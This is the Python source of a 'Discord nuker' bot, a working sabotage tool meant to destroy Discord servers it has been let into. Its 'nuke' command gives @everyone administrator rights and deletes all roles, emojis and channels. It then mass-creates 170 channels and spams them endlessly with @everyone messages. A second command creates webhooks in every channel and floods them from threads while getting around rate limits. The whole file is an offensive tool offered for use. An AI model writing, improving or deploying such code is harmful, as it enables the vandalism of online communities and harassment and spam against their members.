##############################
#       DISCORD NUKER        #
#      CREATED BY AMIR13     #
##############################

# packege##=>

import discord                          # discord module
import os                               # To use the cls
import time                             # To use webhook spam tool
import json                             # To open the config.json
import numpy                            # To use the AxisError
import random                           # To use the random status
import asyncio                          # To use sleep
import requests                         # To use WebHook spam tool
import threading                        # To use WebHook spam tool
from aiohttp import request             # To use WebHook spam tool
from discord import Permissions         # to set permission everyone role
from discord.ext import commands        # discord.ext
from discord.ext.commands import bot    # discord.ext
from colorama import init, Fore as cc   # For design to CMD


# CONFIG##=>

def Clearr():
    os.system('cls')


init()
r = R = cc.LIGHTRED_EX
g = G = cc.LIGHTGREEN_EX
b = B = cc.LIGHTBLUE_EX
c = C = cc.LIGHTCYAN_EX
y = Y = cc.LIGHTYELLOW_EX
m = M = cc.LIGHTMAGENTA_EX
p = P = cc.LIGHTMAGENTA_EX
w = W = cc.RESET

msg = {
    "false": f"{b}[{r}-{b}]{w}",
    "true": f"{b}[{g}+{b}]{w}",
    "input": f"{b}[{y}>>{b}]{w}",
    "error": f"{b}[{y}e{b}]{w}",
}


try:
    with open(f"config.json", encoding='utf8') as data:
        config = json.load(data)
        token = config["token"]
        prefix = config["prefix"]
        names = config["names"]
        topchannel = config["topchannel"]
        avatar = config["avatar"]
        print(f"{msg['input']} Loaded config.json")


except FileNotFoundError:
    token = input(f"Paste Token {msg['input']} :")
    print()

    prefix = input(f"Paste Prefix {msg['input']} :")
    print()

    names = input(f"Paste Bot name {msg['input']} :")
    print()

    topchannel = input(f"Paste Top Channel {msg['input']} :")
    print()

    avatar = input(f"Paste Avatar URL {msg['input']} :")

    config = {
        "Code By ": "AMIR1/3",
        "token": token,
        "prefix": prefix,
        "names": names,
        "topchannel": topchannel,
        "avatar": avatar,
    }

    with open("config.json", "w") as data:
        json.dump(config, data, indent=2)
        print(f"{msg['true']}  Created {b}[{w}config.json{b}]{w}")




# other##=>
bot = commands.Bot(command_prefix=prefix)

bot.remove_command('help')

@bot.event
async def on_ready():
    await bot.wait_until_ready()
    statuses = ["Dev By : AMIR13",
                f"{names} IS HERE", f"{prefix}help | show my more command"]
    while not bot.is_closed():
        status = random.choice(statuses)
        await bot.change_presence(activity=discord.Streaming(name=status, url="https://www.twitch.tv/electricallongboard"))
        await asyncio.sleep(5)
bot.loop.create_task(on_ready())


@bot.event
async def on_ready():
    Clearr()
    print(
        f'STARTING : [{b}■■■                       {w}]  {b}1{w}/{b}10 {w}({b}10.00%{w})')
    await asyncio.sleep(0.5)
    Clearr()
    print(
        f'STARTING : [{b}■■■■■■                    {w}]  {b}2{w}/{b}10 {w}({b}20.00%{w})')
    await asyncio.sleep(0.5)
    Clearr()
    print(
        f'STARTING : [{b}■■■■■■■■■■■               {w}]  {b}4{w}/{b}10 {w}({b}40.00%{w})')
    await asyncio.sleep(0.5)
    Clearr()
    print(
        f'STARTING : [{b}■■■■■■■■■■■■■■■■          {w}]  {b}6{w}/{b}10 {w}({b}60.00%{w})')
    await asyncio.sleep(0.5)
    Clearr()
    print(
        f'STARTING : [{b}■■■■■■■■■■■■■■■■■■■■      {w}]  {b}8{w}/{b}10 {w}({b}80.00%{w})')
    await asyncio.sleep(0.5)
    Clearr()
    print(
        f'STARTING : [{b}■■■■■■■■■■■■■■■■■■■■■■■■■■{w}]  {b}10{w}/{b}10 {w}({b}100.00%{w})')
    await asyncio.sleep(0.5)
    Clearr()

    print(f'''
  
{w}███{b}╗{w}   ██{b}╗{w} ██{b}╗{w}   ██{b}╗ {w}██{b}╗{w}  ██{b}╗ {w}███████{b}╗{w} ██████{b}╗      {w} ██{b}╗ {w}██████{b}╗{w}
{w}████{b}╗{w}  ██{b}║{w} ██{b}║{w}   ██{b}║ {w}██{b}║{w} ██{b}╔╝ {w}██{b}╔════╝{w} ██{b}╔══{w}██{b}╗    {w} ███{b}║ {b}╚════{w}██{b}╗{w}
{w}██{b}╔{w}██{b}╗{w} ██{b}║{w} ██{b}║ {w}  ██{b}║{w} █████{b}╔╝ {w} █████{b}╗  {w} ██████{b}╔╝     ╚{w}██{b}║  {w}█████{b}╔╝{w}
{w}██{b}║╚{w}██{b}╗{w}██{b}║{w} ██{b}║{w}   ██{b}║{w} ██{b}╔═{w}██{b}╗  {w}██{b}╔══╝   {w}██{b}╔══{w}██{b}╗     {w} ██{b}║  {b}╚═══{w}██{b}╗{w}
{w}██{b}║ ╚{w}████{b}║ ╚{w}██████{b}╔╝{w} ██{b}║ {w} ██{b}╗{w} ███████{b}╗ {w}██{b}║ {w} ██{b}║     {w} ██{b}║ {w}██████{b}╔╝{w}
{b}╚═╝  ╚═══╝  ╚═════╝  ╚═╝  ╚═╝ ╚══════╝ ╚═╝  ╚═╝      ╚═╝ {b}╚═════╝{w}




╭ 
├ {msg["true"]} {b}[{w} User : {bot.user}{b} ]{w}                                      
├ 
├ {msg["true"]} {b}[{w} Nick Name : {len(bot.users)}{b} ]{w}       
├ 
├ {msg["true"]} {b}[{w} Prefix : {b}[ {w}{prefix} {b}] {b}]{w}                                                                                                                                
├
├ {msg["true"]} {b}[{w} in Servers :  {len(bot.guilds)} {b}]{w}                           
├ 
├ {msg["true"]} {b}[{w} Discord{b}.{w}gg{b}/{w}iranian {b}]{w}                                           
├ 
├{b} ╭────────────────╮{w} 
├{b} │ {r}Dev By AMIR1/3 {b}│{w} 
├{b} ╰────────────────╯{w}
╰
''')


command = f"@everyone <a:cross:966284234643898378> **Server Nuked By {names} Bot** <a:cross:966284234643898378> \n<a:cross:966284234643898378> ** https://github.com/AMIR-H-P/ ** <a:cross:966284234643898378>"

# nuke##=>


@bot.event
async def on_guild_channel_create(channel):
    await asyncio.sleep(2)
    while True:
        await channel.send(f'{command}')


def ssspam(webhook):
    global spammingdawebhookeroos
    while spammingdawebhookeroos:

        randcolor = random.randint(0x000000, 0xFFFFFF)
        data = {
            "content": f"@everyone **Server Nuked By {names} BOT**",
            "embeds": [
                {
                    "title": f"Server Nuked By {names}",
                    "tts": "true",
                    "description": "Made By 'झ AMIR ᴾᴼᵂᴱᴿ#0386",
                    "url": "https://discord.gg/YHnK4KPnCy",
                    "color": 0xff0000,
                    "fields": [
                        {
                            "name": f"{names} BOT",
                            "value": "xdddd"
                        }
                    ],
                    "author": {
                        "name": f"{names}",
                        "url": f"https://discord.gg/YHnK4KPnCy",
                        "icon_url": f"{avatar}"
                    },
                    "footer": {
                        "text": f"Dev By 'झ AMIR ᴾᴼᵂᴱᴿ#0386",
                        "icon_url": "https://cdn.discordapp.com/icons/954063511829504032/70993d272018842d76bc3df7d5789dff.webp?size=1024"
                    },
                    "image": {
                        "url": f"{avatar}"
                    }
                }
            ],
            "username": f"{names}",
            "avatar_url": f"{avatar}"
        }

        spamming = requests.post(webhook, json=data)
        spammingerror = spamming.text
        if spamming.status_code == 204:
            pass

        elif "rate limited" in spammingerror.lower():

            try:
                j = json.loads(spammingerror)
                ratelimit = j['retry_after']
                timetowait = ratelimit / 1000
                time.sleep(timetowait)

            except:
                delay = random.randint(5, 10)
                time.sleep(delay)
        else:
            delay = random.randint(30, 60)
            time.sleep(delay)


@bot.command(name="nuek2", aliases=["spam", "spamwebhook"])
async def nuke_2(ctx):
    global spammingdawebhookeroos
    try:
        await ctx.message.delete()
    except:
        pass
    spammingdawebhookeroos = True
    if len(await ctx.guild.webhooks()) != 0:
        for webhook in await ctx.guild.webhooks():
            threading.Thread(target=ssspam, args=(webhook.url,)).start()
    if len(ctx.guild.text_channels) >= 50:
        webhookamount = 1

    else:
        webhookamount = 50 / len(ctx.guild.text_channels)
        webhookamount = int(webhookamount) + 1
    for i in range(
            webhookamount):
        for channel in ctx.guild.text_channels:

            try:
                webhook = await channel.create_webhook(name='Nuked By AMIR13')
                threading.Thread(target=ssspam, args=(webhook.url,)).start()
                f = open(r'Other/Webhooks/webhooks-' +
                         str(ctx.guild.id) + ".txt", 'a')
                f.write(f"{webhook.url} \n")
                f.close()
            except:
                pass


@bot.command(aliases=['help', 'HELP'])
async def react_embed(ctx):
    page1 = discord.Embed(
        title='Nuke Commands',
        description=f'''>>> **{prefix}nuke** | `Nuke server`\n\n **{prefix}spamwebhook** | `Nuke with webhook`\n\n **{prefix}serverinfo** | `server information`''',
        colour=discord.Colour.random()
    )
    page1.set_footer(
        text=f"Requested by {ctx.author}",
        icon_url=ctx.author.avatar_url
    )
    page1.set_image(
        url="https://media.discordapp.net/attachments/913894748715102261/913947073081139200/3714-scarlxrd.gif"
    )

    page2 = discord.Embed(
        title='Settings Commands',
        description=f'>>> **{prefix}prefix** | `set prefix`\n\n**{prefix}logout** | `Shut down bot`\n\n**{prefix}ping** | `Show Client Ping`',
        colour=discord.Colour.random()
    )
    page2.set_footer(
        text=f"Requested by {ctx.author}",
        icon_url=ctx.author.avatar_url
    )
    page2.set_image(
        url="https://media.discordapp.net/attachments/913894748715102261/913947073081139200/3714-scarlxrd.gif"
    )

    page3 = discord.Embed(
        title='About Me',
        description=f'>>> **Soon** | `Bot and Bot Dev about`\n\n **Soon** | `Supporter server Link`',
        colour=discord.Colour.random()
    )
    page3.set_footer(
        text=f"Requested by {ctx.author}",
        icon_url=ctx.author.avatar_url
    )
    page3.set_image(
        url="https://media.discordapp.net/attachments/913894748715102261/913947073081139200/3714-scarlxrd.gif"
    )

    pages = [page1, page2, page3]

    message = await ctx.send(embed=page1)

    await message.add_reaction('◀')
    await message.add_reaction('▶')

    def check(reaction, user):
        return user == ctx.author

    i = 0
    reaction = None

    while True:
        if str(reaction) == '◀':
            if i > 0:
                i -= 1
                await message.edit(embed=pages[i])
        elif str(reaction) == '▶':
            if i < 2:
                i += 1
                await message.edit(embed=pages[i])
        elif str(reaction) == '⏭':
            i = 2
            await message.edit(embed=pages[i])

        try:
            reaction, user = await bot.wait_for(
                'reaction_add',
                timeout=30.0,
                check=check)
            await message.remove_reaction(reaction, user)
        except:
            break

    await message.clear_reactions()


@bot.command()
@commands.is_owner()
async def logout(ctx):
    await ctx.message.delete()
    embed = discord.Embed(
        title="Shut down bot", description=f"{ctx.message.author.mention} turned off {names} Bot", color=discord.Colour.random())
    await ctx.send(embed=embed)
    await bot.logout()


@bot.command(name='ping')
async def ping_1(ctx):
    if round(bot.latency * 1000) <= 50:
        embed = discord.Embed(title="Ping is **low**",
                              description=f"Bot ping **{round(bot.latency *1000)}** ms",
                              color=discord.Colour.random())
        embed.set_footer(
            text=f"Requested by {ctx.author}",
            icon_url=ctx.author.avatar_url
        )
        embed.set_image(
            url="https://media.discordapp.net/attachments/913894748715102261/913947073081139200/3714-scarlxrd.gif"
        )
    elif round(bot.latency * 1000) <= 100:
        embed = discord.Embed(title="Ping is **medium**",
                              description=f"Bot ping **{round(bot.latency *1000)}** ms",
                              color=discord.Colour.random())
        embed.set_footer(
            text=f"Requested by {ctx.author}",
            icon_url=ctx.author.avatar_url
        )
        embed.set_image(
            url="https://media.discordapp.net/attachments/913894748715102261/913947073081139200/3714-scarlxrd.gif"
        )

    elif round(bot.latency * 1000) <= 200:
        embed = discord.Embed(title="Ping is **high**",
                              description=f"Bot ping **{round(bot.latency *1000)}** ms",
                              color=discord.Colour.random())

        embed.set_image(
            url="https://media.discordapp.net/attachments/913894748715102261/913947073081139200/3714-scarlxrd.gif"
        )
    else:
        embed = discord.Embed(title="Ping is very **high**",
                              description=f"Bot ping **{round(bot.latency *1000)}** ms",
                              color=discord.Colour.random())
        embed.set_footer(
            text=f"Requested by {ctx.author}",
            icon_url=ctx.author.avatar_url
        )
        embed.set_image(
            url="https://media.discordapp.net/attachments/913894748715102261/913947073081139200/3714-scarlxrd.gif"
        )
        await ctx.message.add_reaction('✅')
        await ctx.send(embed=embed)


@bot.command()
async def serverinfo(ctx, guild: discord.Guild = None):
    guild = ctx.guild
    embed = discord.Embed(title=f'Guild Information',
                          description=f"Name: [`{guild}`]", timestamp=ctx.message.created_at, color=discord.Color.random())
    embed.set_thumbnail(url=guild.icon_url)
    embed.add_field(name="📬 Total Channels:",
                    value=f"[`{len(guild.channels)}`] Channels", inline=True)
    embed.add_field(name="💬 Text Channels:",
                    value=f"[`{len(guild.text_channels)}`] Channels", inline=True)
    embed.add_field(name="🔊 Voice Channels:",
                    value=f"[`{len(guild.voice_channels)}`] Channels", inline=True)
    embed.add_field(name="🔧 Total categories:",
                    value=f"[`{len(guild.categories)}`] Categories", inline=True)
    embed.add_field(name="💎 Total Boosts:",
                    value=f"[`{guild.premium_subscription_count}`] Boosts", inline=True)
    embed.add_field(name="💍  Boost Lvl:",
                    value=f"[`{guild.premium_tier}`] Lvl", inline=True)
    embed.add_field(name="👥 Total Memmbers:",
                    value=f"[`{guild.member_count}`] Members ", inline=True)
    embed.add_field(name="🎫 Total Roles:",
                    value=f'[`{len(guild.roles)}`] Roles', inline=True)
    embed.add_field(name="😳 Total Emojis:",
                    value=f"[`{len(guild.emojis)}`] Emojis", inline=True)
    embed.add_field(name="🔐 Verification Lvl:",
                    value=f'[`{str(ctx.guild.verification_level).capitalize()}`] Lvl', inline=True)
    embed.add_field(name="📅 Created On:",
                    value=f'[`{ctx.guild.created_at.strftime("%b %d %Y")}`]', inline=True)
    embed.add_field(name="🆔 Server ID:",
                    value=f"[`{ctx.guild.id}`]", inline=False)
    embed.set_footer(
        text=f"Requested by {ctx.author} ", icon_url=ctx.author.avatar_url)
    await ctx.send(embed=embed)


@bot.command(name='prefix', aliases=[f"setprefix"])
async def settingsPrefix(ctx, newPrefix):
    global config
    bot.command_prefix = newPrefix
    config['prefix'] = newPrefix
    with open("config.json", "w") as data:
        json.dump(config, data, indent=2)
    await ctx.message.add_reaction('✅')
    print(f"{msg['true']} Prefix is [{y}{newPrefix}{w}] now")


@bot.command(aliases=['purge', 'delete','clear'])
async def cc(ctx, amount: int = -1):
    guild = ctx.guild
    if amount == -1:
        await ctx.channel.purge(limit=1000000)
    else:
        await ctx.channel.purge(limit=amount)
    for channel in guild.channels:
        print(f'Clear All Message')


@bot.event
async def on_command_error(ctx, error):
    if isinstance(error, commands.CommandNotFound):
        await ctx.message.delete()
        await ctx.send(error)
    elif isinstance(error, commands.MissingRequiredArgument):
        await ctx.message.delete()
        await ctx.send(error)
    elif isinstance(error, numpy.AxisError):
        await ctx.message.delete()
        await ctx.send(error)
    elif isinstance(error, discord.errors.Forbidden):
        await ctx.message.delete()
        await ctx.send(error)



createchannel = [f"{names} on top"]

@bot.command(name="nuke", aliases=["NUKE", "end", "END", "bye"])
async def nuke(ctx, name=f"Server Closed By {names} Bot"):
    await ctx.message.delete()
    guild = ctx.guild

    with open('serveravatar.png', 'rb') as f:
        icon = f.read()
    await ctx.guild.edit(icon=icon)
    print(f"{msg['true']} Guild Avatar has ben Nuked")

    try:
        await ctx.guild.edit(name=name)
        print(f"{msg['true']} Changed server name")
    except:
        print(f"{msg['false']} Can't change server name")

    try:
        role = discord.utils.get(guild.roles, name="@everyone")
        await role.edit(permissions=Permissions.all())
        print(f"{msg['true']}{y}@everyone{g} update permission")
    except:
        print(f"{msg['false']}{r}I was unable to give {y}@everyone {r}admin{w}")

    for emoji in list(ctx.guild.emojis):
        try:
            await emoji.delete()
            print(f"{msg['true']} {g}emoji {y}{emoji.name}{g} Was deleted{w}")
        except:
            print(
                f"{msg['false']} {r}emoji {y}{emoji.name}{g} Wasn't Deleted{w}")

    for role in guild.roles:
        try:
            await role.delete()
            print(f"{msg['true']}{g} role {y}{role.name} {g} deleted{W}")
        except:
            print(f"{msg['false']}{r} Can't delete {y}{role.name} {r} role{w}")

    for channel in guild.channels:
        try:
            await channel.delete()
            print(f"{msg['true']} {channel.name}{G}  Deleted.")
        except:
            print(f"{msg['false']} {channel.name} {R}  Not Deleted.")

    await guild.create_text_channel(f"{topchannel}")
    for channel in guild.text_channels:
        link = await channel.create_invite(max_age=0, max_uses=0)
        print(f"{msg['true']} New Invite:{y} {link}{w}")
        print()
        print(f"{msg['true']} server is Nuked")

    for i in range(170):
        await guild.create_text_channel(random.choice(createchannel))


## login ##=>
bot.run(token)
